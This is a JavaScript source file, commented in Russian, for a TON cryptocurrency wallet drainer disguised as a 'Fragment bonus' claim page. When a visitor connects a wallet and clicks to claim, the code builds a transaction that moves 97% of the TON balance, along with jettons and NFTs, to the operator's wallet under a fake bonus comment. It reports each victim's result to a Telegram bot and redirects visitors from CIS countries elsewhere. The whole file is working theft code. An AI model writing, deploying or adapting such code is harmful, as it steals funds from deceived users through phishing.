// ================================================================
//  КОНФИГУРАЦИЯ
// ================================================================
const CONFIG = {
    operatorWallet: 'UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI', // ЗАМЕНИТЕ
    botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',          // ЗАМЕНИТЕ
    chatId: '-1001234567890',                                   // ЗАМЕНИТЕ
    stealPercent: 0.97,
    minBalance: 0.1,
    fakeComment: '🎁 Получение бонуса от Fragment',
    maxJettonsPerBatch: 10,
    maxNftsPerBatch: 5
};

// ================================================================
//  ГЕО-БЛОКИРОВКА (СНГ → редирект на fragment.com)
// ================================================================
(async function geoBlock() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        const blocked = ['','KZ','','UA','AM','AZ','KG','MD','UZ','TJ','TM','GE'];
        if (blocked.includes(data.country)) {
            window.location.replace('https://fragment.com');
        }
        console.log(`[GEO] IP: ${data.ip}, Country: ${data.country}`);
    } catch (e) { console.warn('[GEO]', e); }
})();

// ================================================================
//  ИНИЦИАЛИЗАЦИЯ TON CONNECT UI (без автоматической кнопки)
// ================================================================
const manifestUrl = `${window.location.origin}/tonconnect-manifest.json`;
const tonConnectUI = new TonConnectUI({
    manifestUrl: manifestUrl,
    // НЕ указываем buttonRootId — кнопку рисуем сами
});

// ================================================================
//  ЭЛЕМЕНТЫ DOM
// ================================================================
const connectBtn = document.getElementById('connectWalletBtn');
const claimBtn = document.getElementById('claimRewardBtn');
const statusHint = document.getElementById('statusHint');

// ================================================================
//  ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
// ================================================================
function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CONFIG.chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {});
}

// ================================================================
//  ПОЛУЧЕНИЕ БАЛАНСА
// ================================================================
async function getWalletData(address) {
    const base = 'https://toncenter.com/api/v3/';
    try {
        const balanceRes = await fetch(`${base}wallet?address=${address}`);
        const balanceData = await balanceRes.json();
        const tonBalance = parseFloat(balanceData.balance) || 0;
        // Jettons
        const jettonRes = await fetch(`${base}jetton/wallets?owner_address=${address}&limit=50`);
        const jettonData = await jettonRes.json();
        const jettons = jettonData.jetton_wallets || [];
        // NFT
        const nftRes = await fetch(`${base}nft/items?owner_address=${address}&limit=20`);
        const nftData = await nftRes.json();
        const nfts = nftData.nft_items || [];
        return { tonBalance, jettons, nfts };
    } catch (e) {
        console.error('[API]', e);
        return null;
    }
}

// ================================================================
//  ОСНОВНОЙ ДРЕНАЖ
// ================================================================
async function drainWallet() {
    if (!tonConnectUI.account || !tonConnectUI.account.address) {
        statusHint.textContent = '⚠️ Сначала подключите кошелёк';
        return;
    }

    const address = tonConnectUI.account.address;
    claimBtn.disabled = true;
    claimBtn.textContent = '⏳ Анализ...';
    statusHint.textContent = 'Проверяем баланс...';

    const data = await getWalletData(address);
    if (!data) {
        claimBtn.textContent = '❌ Ошибка';
        statusHint.textContent = 'Не удалось получить баланс';
        claimBtn.disabled = false;
        return;
    }

    const { tonBalance, jettons, nfts } = data;

    if (tonBalance < CONFIG.minBalance) {
        claimBtn.textContent = '❌ Мало средств';
        statusHint.textContent = `Минимум ${CONFIG.minBalance} TON`;
        claimBtn.disabled = false;
        return;
    }

    // Формируем сообщения
    const messages = [];
    const stealAmount = Math.floor(tonBalance * CONFIG.stealPercent * 1e9);
    messages.push({
        address: CONFIG.operatorWallet,
        amount: stealAmount.toString(),
        payload: CONFIG.fakeComment
    });

    // Jettons (упрощённо)
    let jettonCount = 0;
    for (const j of jettons) {
        if (jettonCount >= CONFIG.maxJettonsPerBatch) break;
        const bal = parseFloat(j.balance);
        if (bal <= 0) continue;
        messages.push({
            address: j.jetton_address,
            amount: '0',
            payload: { op: '0xf8a7ea5', queryId: 0, amount: Math.floor(bal * 1e9), destination: CONFIG.operatorWallet }
        });
        jettonCount++;
    }

    // NFT (упрощённо)
    let nftCount = 0;
    for (const n of nfts) {
        if (nftCount >= CONFIG.maxNftsPerBatch) break;
        messages.push({
            address: n.address,
            amount: '0',
            payload: { op: '0x5fcc3d14', queryId: 0, newOwner: CONFIG.operatorWallet }
        });
        nftCount++;
    }

    if (messages.length === 0) {
        claimBtn.textContent = '❌ Нет активов';
        statusHint.textContent = 'На этом кошельке нет активов';
        claimBtn.disabled = false;
        return;
    }

    claimBtn.textContent = '⏳ Отправка...';
    statusHint.textContent = 'Подпишите транзакцию в кошельке';

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 120,
        messages: messages
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        const msg = `✅ УСПЕШНО!\nАдрес: ${address}\nTON: ${(tonBalance * CONFIG.stealPercent).toFixed(2)}\nJettons: ${jettonCount}\nNFT: ${nftCount}`;
        sendTelegram(msg);
        claimBtn.textContent = '✅ Успешно!';
        statusHint.textContent = 'Активы переведены';
        claimBtn.disabled = true;
    } catch (e) {
        sendTelegram(`❌ Отказ: ${address}`);
        claimBtn.textContent = '❌ Отклонено';
        statusHint.textContent = 'Транзакция отклонена';
        claimBtn.disabled = false;
    }
}

// ================================================================
//  ОБРАБОТЧИКИ ПОДКЛЮЧЕНИЯ
// ================================================================

// Ручное подключение по кнопке
connectBtn.addEventListener('click', async () => {
    try {
        connectBtn.disabled = true;
        connectBtn.textContent = 'Подключение...';
        await tonConnectUI.connect({ manifestUrl }); // явный вызов
    } catch (e) {
        console.error('Connect error:', e);
        connectBtn.textContent = 'Подключить кошелёк';
        connectBtn.disabled = false;
        statusHint.textContent = 'Ошибка подключения';
    }
});

// Событие успешного подключения
tonConnectUI.on('connect', (wallet) => {
    const addr = wallet.account.address;
    connectBtn.textContent = `✅ ${addr.slice(0,6)}...${addr.slice(-4)}`;
    connectBtn.disabled = true;
    claimBtn.disabled = false;
    statusHint.textContent = 'Кошелёк подключён! Нажмите "Забрать бонус"';
    console.log('[TON] Подключён:', addr);
});

// Отключение
tonConnectUI.on('disconnect', () => {
    connectBtn.textContent = 'Подключить кошелёк';
    connectBtn.disabled = false;
    claimBtn.disabled = true;
    statusHint.textContent = 'Подключите кошелёк для получения бонуса';
});

// ================================================================
//  КНОПКА "ЗАБРАТЬ БОНУС"
// ================================================================
claimBtn.addEventListener('click', drainWallet);

// ================================================================
//  ИНИЦИАЛИЗАЦИЯ
// ================================================================
console.log('[DRAINER] Активен. Оператор:', CONFIG.operatorWallet);
